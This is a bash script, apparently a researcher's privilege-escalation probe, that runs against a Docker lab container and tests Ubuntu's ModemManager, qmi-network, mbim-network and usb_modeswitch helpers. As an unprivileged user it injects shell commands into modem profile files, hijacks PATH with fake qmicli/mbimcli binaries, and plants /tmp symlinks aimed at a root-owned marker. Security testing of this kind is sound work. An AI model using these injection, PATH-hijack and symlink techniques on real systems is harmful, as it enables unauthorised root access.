#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$container" bash -s <<'TARGET'
set -euo pipefail

marker=/root/wwan_modem_helpers_lpe_marker
work=/home/attacker/wwan_modem_helpers_probe

cleanup() {
  rm -f "$marker" /tmp/qmi-network-state-wwanlpe /tmp/mbim-network-state-wwanlpe /tmp/wwan_modem_*
  rm -rf "$work"
  systemctl stop ModemManager.service 'usb_modeswitch@wwanlpe.service' >/dev/null 2>&1 || true
  systemctl reset-failed ModemManager.service 'usb_modeswitch@*.service' >/dev/null 2>&1 || true
}
trap cleanup EXIT INT TERM
cleanup

run_attacker() {
  echo "### attacker: $*"
  set +e
  runuser -u attacker -- timeout 20s bash -lc "$*" 2>&1
  rc=$?
  set -e
  echo "rc=$rc"
}

run_root() {
  echo "### root: $*"
  set +e
  timeout 20s bash -lc "$*" 2>&1
  rc=$?
  set -e
  echo "rc=$rc"
}

echo "## target and package proof"
id
id attacker
sed -n '1,8p' /etc/os-release
uname -a
dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' modemmanager libqmi-utils libmbim-utils usb-modeswitch 2>&1 | sort
dpkg-query -S /usr/sbin/ModemManager /usr/bin/qmi-network /usr/bin/mbim-network /usr/sbin/usb_modeswitch_dispatcher /usr/lib/udev/rules.d/40-usb_modeswitch.rules /lib/udev/rules.d/40-usb_modeswitch.rules 2>&1 | sort || true

echo "## unit and service proof"
systemctl list-unit-files ModemManager.service usb_modeswitch@.service --no-pager || true
systemctl cat ModemManager.service usb_modeswitch@.service --no-pager 2>&1 | sed -n '1,220p'
for u in ModemManager.service usb_modeswitch@wwanlpe.service; do
  echo "--- $u"
  systemctl show "$u" -p LoadState -p UnitFileState -p ActiveState -p SubState -p ConditionResult -p FragmentPath -p ExecStart -p Environment -p User -p BusName 2>&1 || true
done
busctl --system list 2>/dev/null | grep -E 'ModemManager|NetworkManager|polkit' || true

echo "## vulnerable-looking script/config proof"
nl -ba /usr/bin/qmi-network | sed -n '107,225p'
echo "--- mbim"
nl -ba /usr/bin/mbim-network | sed -n '93,220p'
echo "--- usb modeswitch rules and dispatcher lines"
grep -nE 'RUN\\+=\"usb_modeswitch|usb_modeswitch_dispatcher|TMPDIR|/var/log/usb_modeswitch|/var/lib/usb_modeswitch|/etc/usb_modeswitch.d|exec /usr/sbin/usb_modeswitch' /usr/lib/udev/rules.d/40-usb_modeswitch.rules /usr/sbin/usb_modeswitch_dispatcher 2>/dev/null | sed -n '1,260p'

echo "## filesystem trust roots"
for p in \
  /usr/bin/qmi-network \
  /usr/bin/mbim-network \
  /usr/bin/qmicli \
  /usr/bin/mbimcli \
  /usr/sbin/ModemManager \
  /usr/sbin/usb_modeswitch_dispatcher \
  /usr/sbin/usb_modeswitch \
  /usr/lib/udev/rules.d/40-usb_modeswitch.rules \
  /etc/qmi-network.conf \
  /etc/mbim-network.conf \
  /etc/ModemManager \
  /etc/ModemManager/fcc-unlock.d \
  /etc/ModemManager/connection.d \
  /usr/share/ModemManager/fcc-unlock.available.d \
  /usr/share/ModemManager/connection.available.d \
  /etc/usb_modeswitch.d \
  /usr/share/usb_modeswitch \
  /var/lib/usb_modeswitch \
  /run/udev \
  /sys; do
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -Lc '%A %a %U:%G %n type=%F' "$p"
  else
    echo "MISSING $p"
  fi
done

echo "## attacker cannot write root trust roots"
run_attacker '
id
for p in \
  /etc/qmi-network.conf \
  /etc/mbim-network.conf \
  /etc/ModemManager/fcc-unlock.d/9999 \
  /etc/ModemManager/connection.d/99-lpe \
  /etc/usb_modeswitch.d/ffff:ffff \
  /var/lib/usb_modeswitch/ffff:ffff \
  /run/udev/wwan_modem_lpe \
  /sys/wwan_modem_lpe; do
  echo "--- $p"
  mkdir -p "$(dirname "$p")" 2>/tmp/wwan_modem_mkdir.err || true
  printf "owned\n" > "$p" 2>/tmp/wwan_modem_write.err
  echo "write_rc=$? err=$(cat /tmp/wwan_modem_write.err 2>/dev/null)"
done
'

echo "## attacker direct qmi/mbim profile, PATH, and /tmp state primitives"
run_attacker '
set -e
mkdir -p "$HOME/wwan_modem_helpers_probe/bin"
cat > "$HOME/wwan_modem_helpers_probe/profile-qmi.conf" <<EOF
APN=internet
PROXY=no
IP_TYPE=4
PROFILE=
id > "$HOME/wwan_modem_helpers_probe/profile_qmi_uid"
touch /root/wwan_modem_helpers_lpe_marker 2>/dev/null || true
EOF
cat > "$HOME/wwan_modem_helpers_probe/profile-mbim.conf" <<EOF
APN=internet
PROXY=no
id > "$HOME/wwan_modem_helpers_probe/profile_mbim_uid"
touch /root/wwan_modem_helpers_lpe_marker 2>/dev/null || true
EOF
cat > "$HOME/wwan_modem_helpers_probe/bin/qmicli" <<EOF
#!/bin/sh
id > "$HOME/wwan_modem_helpers_probe/qmicli_uid"
echo "fake qmicli args: \$*" >> "$HOME/wwan_modem_helpers_probe/qmicli_args"
exit 1
EOF
cat > "$HOME/wwan_modem_helpers_probe/bin/mbimcli" <<EOF
#!/bin/sh
id > "$HOME/wwan_modem_helpers_probe/mbimcli_uid"
echo "fake mbimcli args: \$*" >> "$HOME/wwan_modem_helpers_probe/mbimcli_args"
exit 1
EOF
chmod 755 "$HOME/wwan_modem_helpers_probe/bin/qmicli" "$HOME/wwan_modem_helpers_probe/bin/mbimcli"
ln -sf /root/wwan_modem_helpers_lpe_marker /tmp/qmi-network-state-wwanlpe
ln -sf /root/wwan_modem_helpers_lpe_marker /tmp/mbim-network-state-wwanlpe
PATH="$HOME/wwan_modem_helpers_probe/bin:$PATH" /usr/bin/qmi-network --profile="$HOME/wwan_modem_helpers_probe/profile-qmi.conf" /tmp/wwanlpe status || true
PATH="$HOME/wwan_modem_helpers_probe/bin:$PATH" /usr/bin/mbim-network --profile="$HOME/wwan_modem_helpers_probe/profile-mbim.conf" /tmp/wwanlpe status || true
for f in "$HOME"/wwan_modem_helpers_probe/*_uid "$HOME"/wwan_modem_helpers_probe/*_args; do
  [ -e "$f" ] && { echo "--- $f"; cat "$f"; }
done
test -e /root/wwan_modem_helpers_lpe_marker && echo direct_root_marker || echo no_direct_root_marker
'

echo "## attacker service, D-Bus, and udev/root-helper trigger attempts"
run_attacker '
for cmd in \
  "systemctl start ModemManager.service" \
  "systemctl start usb_modeswitch@wwanlpe.service" \
  "busctl --system introspect org.freedesktop.ModemManager1 /org/freedesktop/ModemManager1" \
  "udevadm trigger --subsystem-match=usb" \
  "/usr/sbin/usb_modeswitch_dispatcher --switch-mode=wwanlpe" \
  "/usr/lib/udev/usb_modeswitch /wwanlpe"; do
  echo "--- $cmd"
  timeout 8s bash -lc "$cmd" 2>&1 | sed -n "1,100p"
  echo cmd_rc=${PIPESTATUS[0]}
done
'

echo "## root condition check for default services"
run_root 'systemctl start ModemManager.service 2>&1; echo modem_start_rc=$?; systemctl status ModemManager.service --no-pager -l 2>&1 | sed -n "1,90p"'
run_root 'systemctl start usb_modeswitch@wwanlpe.service 2>&1; echo modeswitch_start_rc=$?; systemctl status usb_modeswitch@wwanlpe.service --no-pager -l 2>&1 | sed -n "1,120p"; ls -l /var/log/usb_modeswitch_wwanlpe /var/lib/usb_modeswitch/wwanlpe 2>&1 || true'

echo "## root proof before cleanup"
if [ -e "$marker" ]; then
  echo ROOT_PROOF=yes
  stat -Lc '%A %a %U:%G %n' "$marker"
  cat "$marker" 2>/dev/null || true
else
  echo ROOT_PROOF=no
fi

cleanup

echo "## cleanup and health"
for p in "$marker" "$work" /tmp/qmi-network-state-wwanlpe /tmp/mbim-network-state-wwanlpe /var/log/usb_modeswitch_wwanlpe /var/lib/usb_modeswitch/wwanlpe; do
  [ -e "$p" ] || [ -L "$p" ] && echo "LEFT $p" || echo "ABSENT $p"
done
systemctl is-system-running || true
systemctl --failed --no-legend || true
TARGET
